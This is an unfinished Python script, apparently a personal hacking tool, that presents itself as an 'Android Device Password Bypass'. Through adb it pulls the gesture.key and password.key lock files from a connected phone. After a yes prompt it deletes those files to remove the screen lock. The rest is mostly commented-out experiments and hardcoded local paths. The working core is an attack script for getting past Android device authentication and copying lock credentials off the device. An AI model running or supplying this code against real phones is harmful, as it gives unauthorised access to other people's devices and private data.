#Not Completed


from re import X
import os
from sys import stdout
from colorama import Fore
from colorama import Style
import time
from tqdm import tqdm


from PyInquirer import prompt
from PyInquirer import Separator


class Password_Bypass:

    def Pword_Bypass():

        os.system('clear')
        if os.path.isfile("/home/nevin/Desktop/Nev/New/gesture.key"):
            os.remove("/home/nevin/Desktop/Nev/New/gesture.key")
        if os.path.isfile("/home/nevin/Desktop/Nev/New/password.key"):
            os.remove("/home/nevin/Desktop/Nev/New/password.key")

        print(Fore.YELLOW+"Android Device Password Bypass"+Fore.RESET)
        print("______________________________________________________\n")
        
        print(Fore.YELLOW+"Detecting any security locks on device"+Fore.RESET)

        print("\n")
        
        for i in tqdm(range(3)):
            time.sleep(1)


        os.system("adb -e pull /data/system/gesture.key ~/Desktop/Nev/New;adb -e pull /data/system/password.key ~/Desktop/Nev/New;")
        print("\n")

        if (os.path.isfile("/home/nevin/Desktop/Nev/New/gesture.key"))or(os.path.isfile("/home/nevin/Desktop/Nev/New/password.key")):

            print(Fore.RED+"This device is password protected"+Fore.RESET)

            questions = [
           {
            'type': 'list',
            'name': 'select',
            'message': 'Do you want to bypass the password?',
            'choices': [
                Separator(),
                
                'Yes',
                


                

                ]
           }
           ]

            
            print(Fore.YELLOW+"")
            answers = prompt(questions)
            print(Fore.RESET+"")

            if answers == {'select':'Yes'}:
               
               os.system("adb shell rm\ /data/system/gesture.key >/dev/null 2>&1;adb shell rm\ /data/system/password.key >/dev/null 2>&1")
               """ print(Style.BRIGHT+Fore.GREEN+"The Device Password is being bypassed----------------"+Style.NORMAL+Fore.RESET)
               os.system("adb shell rm\ /data/system/gesture.key >/dev/null 2>&1;adb shell rm\ /data/system/password.key >/dev/null 2>&1")
               for i in tqdm(range(3)):
                   time.sleep(2)

               print("\n")
               print(Style.BRIGHT+Fore.GREEN+"The Device Password Bypass Successful!!"+Style.NORMAL+Fore.RESET)
            
            
               print("\n")
               print(Style.BRIGHT+Fore.GREEN+"The Device Password Bypass Successful!!"+Style.NORMAL+Fore.RESET) """

            """ if answers == {'No, Return to the Home Screen'}:
                DProperties.dev_Prop()
                """

               

               


        else:
            print(Fore.GREEN+"This device is not password protected"+Fore.RESET)

        
        

            
        
        

        

        



        
        #os.system("adb shell")

        #if os.system("adb shell ls /data/system/password.key")=="/data/system/password.key":
        #if (os.system("adb shell ls /data/system/gesture.key 2> /dev/null")=='/data/system/gesture.key'):
        """ if (os.system("adb shell ls /data/system/gesture.key 2> /dev/null")=='/data/system/gesture.key'):    

            print(Fore.RED+"This device is password protected"+Fore.RESET)
        else:
            print(Fore.GREEN+"This device is not password protected"+Fore.RESET) """


        """  subprocess=subprocess.Popen(["adb shell ls /data/system/gesture.key"], shell=True, stdout=subprocess.PIPE)
        subprocess_return=subprocess.stdout.read()
        print(subprocess_return) """

        """ print(Fore.RED+"This device is not password protected"+Fore.RESET)
        else:
            print(Fore.GREEN+"This device is password protected"+Fore.RESET) """
 
        #os.system("adb shell rm\ /data/system/gesture.key >/dev/null 2>&1;adb shell rm\ /data/system/gesture.key >/dev/null 2>&1")

        #if (os.system("adb shell ls /data/system/gesture.key 2> /dev/null")=='/data/system/gesture.key'):
        """ if os.path.exists("adb shell ls /data/system/gesture.key"):    
            print(Fore.RED+"This device is password protected"+Fore.RESET)
        else:
            print(Fore.GREEN+"This device is not password protected"+Fore.RESET) """

        

        #x=os.path.isdir("adb shell ls /data/system/gesture.key")

        #print(x)
        """ if (x=="/data/system/gesture.key"):
            print(Fore.RED+"This device is password protected"+Fore.RESET)
        else:
            print(Fore.GREEN+"This device is not password protected"+Fore.RESET)
            """
        #print(os.listdir('adb shell ls /data/system/gesture.key'))    

        
Password_Bypass.Pword_Bypass()
